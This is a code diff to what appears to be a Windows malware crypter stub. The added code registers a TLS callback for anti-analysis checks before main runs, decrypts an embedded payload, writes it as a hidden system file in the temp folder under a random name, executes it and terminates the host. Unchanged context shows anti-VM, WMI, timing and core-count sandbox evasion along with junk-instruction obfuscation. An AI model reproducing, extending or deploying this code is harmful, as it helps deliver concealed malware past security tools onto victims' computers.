@@ -13,7 +13,6 @@
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
-
 // function prototypes
 //replaceatbeginning0
 //replaceatbeginning1
@@ -65,7 +64,35 @@ void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
 void CheckCoreCount(void);
 void testsigning(void);
+// tls declaration
+void NTAPI ormahxatuamm(PVOID DllHandle,DWORD dwReason,PVOID Reserved) // will be run 4 times. 
+{
+//checks here
+         date_specific_check("10/18/2019");
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+			
+}
+//linker spec
+#ifdef _M_IX86
+#pragma comment (linker, "/INCLUDE:__tls_used")
+#pragma comment (linker, "/INCLUDE:__xl_b")
+#else
+#pragma comment (linker, "/INCLUDE:_tls_used")
+#pragma comment (linker, "/INCLUDE:_xl_b")
+#endif
+#ifdef _M_X64
+#pragma const_seg (".CRT$XLB")
+const
+#else
+#pragma data_seg (".CRT$XLB")
+#endif
+//end linker
+//tls import
+EXTERN_C PIMAGE_TLS_CALLBACK _xl_b = ormahxatuamm;
+#pragma const_seg ()
 //const char g_szClassName[] = "JoeCrypter";
+DWORD rsrc_len = 0;
+
 typedef struct _IO_STATUS_BLOCK
       {
          union
@@ -81,18 +108,17 @@ typedef VOID (NTAPI *PIO_APC_ROUTINE)(
   PIO_STATUS_BLOCK IoStatusBlock,
   ULONG Reserved);
 
-DWORD rsrc_len = 0;
-
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     switch(msg)
     {
 		case WM_CREATE:
 		{	
-
-                                                                                   
+         // same as usual, checks are in the TLS callback function set by the main prog  
+		 // having evasions in the TLS callback breaks things. Certain functions rely on the WndProc
+	     //lotsofwindowshack
 			
-// going extra low level because why the fuck not?
+			// going extra low level because why the fuck not?
 			IO_STATUS_BLOCK blck;
 			typedef NTSTATUS (*_NtWriteFile)(
 			HANDLE           FileHandle,
@@ -106,21 +132,18 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			PULONG           Key);
 
 			_NtWriteFile NtWriteFile = (_NtWriteFile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtWriteFile");
-			byte *payload = decrypted(GetPayload(),rsrc_len, 54519);
-			
+			byte *payload = decrypted(GetPayload(),rsrc_len, 46513);
 			char tempspace[512] = "";
 			char filename[1024] = "";
 			DWORD byteswritten = 0;
 			GetTempPathA(512,tempspace);
-			sprintf(filename,"doit.exe",tempspace); // string replace for a random exe name in C# prog
-			HANDLE tmphnd =  CreateFile(filename,GENERIC_ALL, 0, NULL, CREATE_ALWAYS,	FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,	NULL);
+			sprintf(filename,"%s2og48l4lv",tempspace); // string replace for a random exe name in C# prog
+			HANDLE tmphnd =  CreateFile(filename,GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
 			NtWriteFile(tmphnd,NULL,NULL,NULL,&blck,payload,rsrc_len,NULL,NULL);
 			
 			CloseHandle(tmphnd);
-			// CreateFile, WriteFile, then SetFileAttributes to hidden and system followed by shellexec or createprocess
-			WinExec(filename,3);
-			TerminateProcess(GetCurrentProcess(),1);
-			
+			WinExec(filename,4);
+			TerminateProcess(GetCurrentProcess(),1); // evasiosn done, file executed, now we terminate host app.
 		}
 		break;
         case WM_CLOSE:
@@ -453,7 +476,7 @@ int FlsTrick(void)
 }
 
 void PassToNoobs(void)
-{
+{	
 // maybe randomize this? cram garbage instructions here. 
 	__asm
 	{
@@ -571,7 +594,6 @@ void checkQIP(void)
 		}
 	}
 }
-
 void anti_vm_wmi_1(void)
 {
     // result code from COM calls
@@ -1441,6 +1463,8 @@ mov x,ecx
 return x;
 }
 
+
+
 int timing_evasion_4(void)
 {	
 	HANDLE hIcmpFile;
@@ -1520,6 +1544,7 @@ void CheckCoreCount(void)
 	proc = GetCurrentProcess();
 	if(GetProcessAffinityMask(proc,&ProcessAffinityMask,&SystemAffinityMask))
 	{
+		
 		corecount = 0;
 		bitpos = 0;
 		do
@@ -1531,10 +1556,12 @@ void CheckCoreCount(void)
 		}
 		while(bitpos < 32);
 		result = corecount;
+
 	}
 	else{
 		GetSystemInfo(&sysinf);
 		result = sysinf.dwNumberOfProcessors;
+		
 	}
 	if(result < 2)
 	{
@@ -1544,7 +1571,6 @@ void CheckCoreCount(void)
 		return;
 	}
 }
-
 typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION
 {
     unsigned long Length;
@@ -1580,7 +1606,6 @@ void testsigning(void)
 		}
 	}
 }
-
 /* possibly use this for verifying sleep took place. Maybe add later.
 	LASTINPUTINFO lel;
 	lel.cbSize = sizeof(LASTINPUTINFO);
